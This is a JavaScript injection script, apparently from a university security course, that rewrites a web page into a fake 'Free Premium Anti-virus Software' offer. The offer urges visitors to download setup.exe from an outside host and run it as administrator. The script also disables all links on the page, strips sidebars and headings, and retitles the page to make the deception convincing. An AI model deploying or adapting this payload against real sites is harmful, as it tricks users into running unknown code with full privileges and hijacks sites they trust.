var newBody = document.createElement("div");
newBody.innerHTML = `
<div width=60%>
    <h1 style='font-size: 24px; padding-top: 40px; padding-bottom: 20px'>Free Premium Anti-virus Software!</h1>
    <p style='font-size: 18px; padding: 5px 0px'>In light of recent data breaches across the globe, we have realized that too many people are vulnerable to cyber attacks. Enough is enough&ndash;we've decided to provide you with a free subscription to the antivirus software that WE use!</p>
    <p style='font-size: 18px; padding: 5px 0px'>This is high-quality, highly reliable malware protection that stops malicious code from even being downloaded to your machine!</p>
    <p style='font-size: 18px; padding: 5px 0px'>All you have to do is click 'download' below and run the setup. The installation will automatically activate your free LIFETIME subscription to the software and you'll never have to think about cybersecurity again!</p>
    <p style='font-size: 18px; padding: 5px 0px'>Instructions: Download the file using the button below. Then, right click on setup.exe and choose 'Run as administrator' and the installation will complete itself.</p>
    <a download='setup.exe' href='https://cse331.andrewjaffie.me/free-antivirus/setup.exe'>
        <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" id="Capa_1" x="0px" y="0px" width="50px" height="50px" viewBox="0 0 475.078 475.077" style="enable-background:new 0 0 475.078 475.077;" xml:space="preserve">
    <g>
        <g>
            <path d="M467.083,318.627c-5.324-5.328-11.8-7.994-19.41-7.994H315.195l-38.828,38.827c-11.04,10.657-23.982,15.988-38.828,15.988    c-14.843,0-27.789-5.324-38.828-15.988l-38.543-38.827H27.408c-7.612,0-14.083,2.669-19.414,7.994    C2.664,323.955,0,330.427,0,338.044v91.358c0,7.614,2.664,14.085,7.994,19.414c5.33,5.328,11.801,7.99,19.414,7.99h420.266    c7.61,0,14.086-2.662,19.41-7.99c5.332-5.329,7.994-11.8,7.994-19.414v-91.358C475.078,330.427,472.416,323.955,467.083,318.627z     M360.025,414.841c-3.621,3.617-7.905,5.424-12.854,5.424s-9.227-1.807-12.847-5.424c-3.614-3.617-5.421-7.898-5.421-12.844    c0-4.948,1.807-9.236,5.421-12.847c3.62-3.62,7.898-5.431,12.847-5.431s9.232,1.811,12.854,5.431    c3.613,3.61,5.421,7.898,5.421,12.847C365.446,406.942,363.638,411.224,360.025,414.841z M433.109,414.841    c-3.614,3.617-7.898,5.424-12.848,5.424c-4.948,0-9.229-1.807-12.847-5.424c-3.613-3.617-5.42-7.898-5.42-12.844    c0-4.948,1.807-9.236,5.42-12.847c3.617-3.62,7.898-5.431,12.847-5.431c4.949,0,9.233,1.811,12.848,5.431    c3.617,3.61,5.427,7.898,5.427,12.847C438.536,406.942,436.729,411.224,433.109,414.841z"></path>
            <path d="M224.692,323.479c3.428,3.613,7.71,5.421,12.847,5.421c5.141,0,9.418-1.808,12.847-5.421l127.907-127.908    c5.899-5.519,7.234-12.182,3.997-19.986c-3.23-7.421-8.847-11.132-16.844-11.136h-73.091V36.543c0-4.948-1.811-9.231-5.421-12.847    c-3.62-3.617-7.901-5.426-12.847-5.426h-73.096c-4.946,0-9.229,1.809-12.847,5.426c-3.615,3.616-5.424,7.898-5.424,12.847V164.45    h-73.089c-7.998,0-13.61,3.715-16.846,11.136c-3.234,7.801-1.903,14.467,3.999,19.986L224.692,323.479z"></path>
        </g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g><g></g>
    </svg>
    </a>
    
</div>
`;
newBody.setAttribute('style', 'text-align: center');

var toReplace = null;
var possible = document.getElementsByTagName('div');
for(var i=0; i < possible.length; i++){
    element = possible[i];
    if(element.getAttribute('role') != null && ['', 'main'].includes(element.getAttribute('role'))){
        toReplace = element;
        break;
    }
}
if(toReplace == null){
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('id') != null && (element.getAttribute('id').includes('content') || element.getAttribute('id').includes('main'))){
            toReplace = element;
            break;
        }
    }
}
if(toReplace == null){
    var inHeader = [];
    if(document.getElementsByTagName('header').length > 0){
        inHeader.push(document.getElementsByTagName('header')[0].querySelectorAll('div'));
    }
    for(var i=0; i < possible.length; i++){
        element = possible[i];
        if(element.getAttribute('class') === 'container' && inHeader != [] && !(Array.from(inHeader[0]).includes(element))){
            toReplace = element;
            break;
        }
    }
}
if(toReplace == null){
    toReplace = document.body;
}
links = document.getElementsByTagName('a');
for(var i=0; i < links.length; i++){
    links[i].onclick = function(){return false;};
}

for(var i=0; i < possible.length; i++){
    element = possible[i];
    if((element.getAttribute('class') != null && element.getAttribute('class').includes('sidebar')) 
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('sidebar'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('right'))
        || (element.getAttribute('id') != null && element.getAttribute('id').includes('left'))){
            element.parentElement.removeChild(element);
        }
}

var h1s = document.getElementsByTagName('h1');
for(var i=0; i < h1s.length; i++)
    h1s[i].parentElement.removeChild(h1s[i]);
document.title = 'Free Premium Anti-virus Software!';

toReplace.parentElement.replaceChild(newBody, toReplace);
